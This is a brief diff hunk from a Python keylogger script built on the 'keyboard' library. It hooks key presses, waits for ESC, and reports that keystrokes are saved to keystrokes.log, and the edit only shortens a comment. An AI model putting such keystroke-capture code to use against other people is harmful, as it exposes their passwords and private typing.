@@ -9,6 +9,6 @@ def on_key_press(event):
 print("Keylogger started. Press ESC to stop.")
 keyboard.on_press(on_key_press)
 
-# Wait for ESC to stop the keylogger
+# Wait for ESC to stop
 keyboard.wait("esc")
 print("Keylogger stopped. Logs saved to keystrokes.log")
